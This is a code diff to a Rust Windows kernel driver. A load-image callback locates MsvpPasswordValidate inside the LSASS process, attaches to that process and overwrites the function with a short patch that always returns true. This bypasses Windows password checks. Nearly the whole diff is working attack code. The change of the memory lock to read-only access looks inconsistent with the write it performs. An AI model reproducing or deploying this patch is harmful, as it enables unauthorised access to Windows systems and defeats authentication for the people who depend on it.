@@ -8,7 +8,7 @@ use core::panic::PanicInfo;
 
 extern crate alloc;
 use alloc::ffi::CString;
-use core::ptr;
+use core::{ffi::c_void, ptr};
 use include::{
     ntddk::{IoAllocateMdl, MmMapLockedPagesSpecifyCache, MmProbeAndLockPages, MmUnmapLockedPages},
     types::{IMAGE_INFO, LOCK_OPERATION, MEMORY_CACHING_TYPE, MM_PAGE_PRIORITY, UNICODE_STRING},
@@ -16,7 +16,6 @@ use include::{
 use kernel_log::KernelLogger;
 use log::LevelFilter;
 use winapi::{
-    ctypes::c_void,
     km::wdm::{DRIVER_OBJECT, KPROCESSOR_MODE},
     shared::{
         ntdef::{HANDLE, NTSTATUS},
@@ -26,14 +25,20 @@ use winapi::{
 
 use crate::include::{
     ntddk::{
-        IoFreeMdl, MmUnlockPages, PsRemoveLoadImageNotifyRoutine, PsSetLoadImageNotifyRoutine,
+        IoFreeMdl, KeAttachProcess, KeDetachProcess, MmUnlockPages, PsLookupProcessByProcessId,
+        PsRemoveLoadImageNotifyRoutine, PsSetLoadImageNotifyRoutine,
     },
-    types::LOAD_IMAGE_NOTIFY_ROUTINE,
+    types::{LOAD_IMAGE_NOTIFY_ROUTINE, PEPROCESS},
 };
 
 const JMP_SIZE: usize = 14;
 const LEA_SIZE: usize = 7;
 const RESTORE_DATA_SIZE: usize = JMP_SIZE + LEA_SIZE;
+const LOGIN_PATCH: [u8; 7] = [
+    0x48, 0x31, 0xC0, // xor rax, rax
+    0x48, 0xFF, 0xC0, // inc rax
+    0xC3, // ret
+];
 
 #[no_mangle]
 #[export_name = "RestoreData"]
@@ -101,7 +106,7 @@ unsafe fn copy_data(src: &[u8], dst: *mut c_void) {
     MmProbeAndLockPages(
         mdl,
         KPROCESSOR_MODE::KernelMode,
-        LOCK_OPERATION::IoModifyAccess,
+        LOCK_OPERATION::IoReadAccess,
     );
     let mapped = MmMapLockedPagesSpecifyCache(
         mdl,
@@ -124,7 +129,7 @@ unsafe fn copy_data(src: &[u8], dst: *mut c_void) {
 
 pub unsafe extern "C" fn load_image_callback(
     full_image_name: *const UNICODE_STRING,
-    _process_id: HANDLE,
+    process_id: HANDLE,
     image_info: *mut IMAGE_INFO,
 ) {
     if (*full_image_name)
@@ -141,6 +146,18 @@ pub unsafe extern "C" fn load_image_callback(
             "[+] MsvpPasswordValidate at address {:?}",
             msvp_password_validate
         );
+
+        log::info!("[*] Attaching to LSASS process");
+        let mut process = PEPROCESS(0);
+        let process_ptr = core::ptr::addr_of_mut!(process);
+        if PsLookupProcessByProcessId(process_id, process_ptr) != STATUS_SUCCESS {
+            panic!("Failed to retrieve process from handle");
+        }
+        KeAttachProcess(process);
+        log::info!("[*] Applying patch");
+        copy_data(&LOGIN_PATCH, msvp_password_validate);
+        log::info!("[+] MsvpPasswordValidate patch applied!");
+        KeDetachProcess();
 
         // Clean-up the load image callback
         // TODO: This crashes the OS... although it didn't before?
